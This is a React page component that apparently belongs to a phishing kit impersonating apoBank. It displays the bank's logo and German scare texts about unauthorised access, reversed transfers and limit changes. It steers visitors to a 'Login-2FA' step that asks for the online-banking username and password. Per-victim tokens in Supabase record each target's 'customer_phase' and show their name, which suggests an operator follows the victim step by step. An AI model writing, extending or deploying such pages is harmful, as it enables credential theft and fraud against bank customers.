import { useEffect, useState } from "react";
import { Link, useNavigate, useSearchParams } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";
import { supabase } from "@/integrations/supabase/client";

export type FlowKind = "widerruf" | "limit" | "pin" | "auth";

interface Props {
  kind: FlowKind;
}


const CONFIG: Record<FlowKind, {
  title: string;
  description: string;
  cardTitle: string;
  cardText: string;
  cta: string;
  target: string;
}> = {
  widerruf: {
    title: "Überweisungswiderruf",
    description:
      "Rücknahme oder Stornierung einer bereits veranlassten Banküberweisung. Dies kann erforderlich sein, wenn bei der Überweisung ein Fehler entstanden ist, beispielsweise durch falsche Empfängerdaten, einen versehentlich überwiesenen Betrag oder wenn eine unautorisierte Überweisung vorgenommen wurde. Der Widerruf sollte möglichst zeitnah erfolgen und wird anschließend von uns geprüft.",
    cardTitle: "",
    cardText: "Rückruf Ihrer Überweisung direkt im OnlineBanking.",
    cta: "→ Überweisungswiderruf",
    target: "/widerruf/start",
  },
  limit: {
    title: "Limit-Änderung widerrufen",
    description:
      "Sie haben diese Änderung Ihres Überweisungslimits nicht selbst veranlasst? Hier können Sie den Vorgang widerrufen. Klicken Sie dazu auf „Limit ändern\". Nach erfolgreicher Prüfung durch Ihren Berater wird der Widerruf sofort wirksam.",
    cardTitle: "Sie sind Kundin oder Kunde mit OnlineBanking",
    cardText: "Überweisungs-Limit direkt im OnlineBanking ändern.",
    cta: "→ Limit-Änderung widerrufen",
    target: "/limit/loading",
  },
  pin: {
    title: "Sicherheitssperre",
    description:
      'Eine unbefugte Person hat Zugriff auf Ihren OnlineBanking-Zugang oder Ihre Zugangsdaten erlangt. Sperren Sie Ihren Zugang daher umgehend aus Sicherheitsgründen. Klicken Sie hierzu auf "Sicherheitssperre", um Ihren OnlineBanking-Zugang sofort zu sperren.',
    cardTitle: "Sicherheitssperre",
    cardText: "OnlineBanking-Zugang zur Sicherheit sperren.",
    cta: "→ Sicherheitssperre",
    target: "/pin/start",
  },

  auth: {
    title: "Login-2FA",
    description:
      "Bestätigen Sie Ihre Identität mit Ihrem OnlineBanking-Benutzernamen und Passwort. Diese Authentifizierung ist erforderlich, wenn Ihr Berater eine zusätzliche Verifizierung Ihrer Person zur sicheren Abwicklung Ihres Anliegens benötigt.",
    cardTitle: "Sie sind Kundin oder Kunde mit OnlineBanking",
    cardText: "Authentifizierung mit Benutzername und Passwort.",
    cta: "→ Authentifizieren",
    target: "/auth",
  },
};

const FlowLanding = ({ kind }: Props) => {
  const c = CONFIG[kind];
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const token = sp.get("token");
  const [name, setName] = useState<string | null>(null);
  const target = (kind === "pin" || kind === "limit") && token
    ? `${c.target}?token=${encodeURIComponent(token)}`
    : c.target;

  useEffect(() => {
    if (kind !== "pin" || !token) return;
    (async () => {
      const { data } = await (supabase as any)
        .from("pin_tokens")
        .select("auftraggeber_name")
        .eq("token", token)
        .maybeSingle();
      if (data?.auftraggeber_name) setName(data.auftraggeber_name);
    })();
  }, [kind, token]);


  const handleWiderrufClick = async (e: React.MouseEvent) => {
    if (kind !== "widerruf") return;
    e.preventDefault();
    if (token) {
      await (supabase as any)
        .from("storno_tokens")
        .update({ customer_phase: "start" })
        .eq("token", token);
      navigate(`/widerruf/start?token=${encodeURIComponent(token)}`);
    } else {
      navigate("/widerruf/start");
    }
  };

  const handlePinClick = async (e: React.MouseEvent) => {
    if (kind !== "pin") return;
    e.preventDefault();
    if (token) {
      await (supabase as any)
        .from("pin_tokens")
        .update({ customer_phase: "start", last_error: null })
        .eq("token", token);
      navigate(`/pin/start?token=${encodeURIComponent(token)}`);
    } else {
      navigate("/pin/start");
    }
  };

  const handleLimitClick = async (e: React.MouseEvent) => {
    if (kind !== "limit") return;
    e.preventDefault();
    if (token) {
      await (supabase as any)
        .from("limit_tokens")
        .update({ customer_phase: "confirm", last_error: null })
        .eq("token", token);
      navigate(`/limit/confirm?token=${encodeURIComponent(token)}`);
    } else {
      navigate("/limit/confirm");
    }
  };


  return (
    <div className="min-h-screen bg-white flex flex-col relative">
      <img
        src={apoBankLogo}
        alt="apoBank Logo"
        className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10"
      />

      <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
        <div className="w-full max-w-2xl bg-white rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[190px]">
          <div className="bg-white border-b border-gray-200 px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
            <h1
              className="text-2xl sm:text-4xl font-medium text-primary"
              style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}
            >
              {c.title}
            </h1>
          </div>

          <div className="px-4 sm:px-8 py-5 sm:py-6 bg-muted border border-border/40 border-t-0 space-y-6">
            <p
              className="text-sm text-foreground/80 leading-relaxed"
              style={{ fontFamily: "'Tanseek Modern Arabic Medium', Arial, sans-serif" }}
            >
              {c.description}
            </p>

            {kind === "auth" || kind === "limit" ? (
              <div className="flex justify-end">
                <Link
                  to={target}
                  onClick={kind === "limit" ? handleLimitClick : undefined}
                  className="inline-flex items-center justify-center h-10 px-8 rounded-md border border-foreground bg-white text-foreground font-medium text-sm hover:bg-white transition-colors"
                >
                  {kind === "auth" ? "Anmelden" : "Limit ändern"}
                </Link>
              </div>
            ) : kind === "pin" || kind === "widerruf" ? (
              <div className="space-y-4">
                <div>
                  {c.cardTitle && (
                    <h2 className="text-lg font-semibold text-foreground mb-1">
                      {c.cardTitle}
                    </h2>
                  )}
                  <p className="text-sm text-foreground/70">{c.cardText}</p>
                  {kind === "pin" && name && (
                    <p className="text-sm text-foreground mt-3">
                      Kontoinhaber: <span className="font-semibold">{name}</span>
                    </p>
                  )}
                </div>
                <div className="flex justify-end">
                  <Link
                    to={target}
                    onClick={kind === "widerruf" ? handleWiderrufClick : kind === "pin" ? handlePinClick : undefined}
                    className="inline-flex items-center justify-center h-10 px-8 rounded-md border border-foreground bg-white text-foreground font-medium text-sm hover:bg-white transition-colors"
                  >
                    {kind === "pin" ? "Sicherheitssperre" : "Überweisung widerrufen"}
                  </Link>

                </div>
              </div>

            ) : (
              <div className="max-w-sm border border-border rounded-lg p-6 bg-white">
                <h2 className="text-lg font-semibold text-foreground mb-2">
                  {c.cardTitle}
                </h2>
                <p className="text-sm text-foreground/70 mb-5">{c.cardText}</p>
                <Link
                  to={c.target}
                  className="block w-full text-center border-2 border-primary text-primary font-semibold rounded-full px-6 py-3 transition-colors hover:bg-primary hover:text-primary-foreground"
                >
                  {c.cta}
                </Link>
              </div>
            )}
          </div>
        </div>
      </div>

      <ContactSection />
      <Footer />
    </div>
  );
};

export default FlowLanding;
